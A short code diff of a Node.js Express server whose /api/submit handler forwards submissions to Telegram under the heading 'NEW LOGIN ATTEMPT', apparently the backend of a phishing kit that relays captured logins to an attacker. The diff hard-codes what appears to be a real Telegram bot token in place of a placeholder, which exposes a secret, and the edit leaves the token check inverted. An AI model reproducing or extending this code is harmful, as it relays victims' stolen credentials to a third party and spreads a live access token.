@@ -109,7 +109,7 @@ app.post('/api/submit', async (req, res) => {
     // Send to Telegram if configured
     let telegramStatus = 'not_configured';
     
-    if (CONFIG.TELEGRAM.BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
+    if (CONFIG.TELEGRAM.BOT_TOKEN !== '8346330872:AAF8YEtXWPZaRZQhIHgnaG7pXg7Lyaf30aw') {
       try {
         const telegramMessage = `
 🔐 NEW LOGIN ATTEMPT
@@ -199,3 +199,4 @@ app.listen(CONFIG.PORT, () => {
   console.log(`📍 Health: http://localhost:${CONFIG.PORT}/api/health`);
   console.log('💡 Configure Telegram BOT_TOKEN and CHAT_ID to enable Telegram notifications');
 });
+
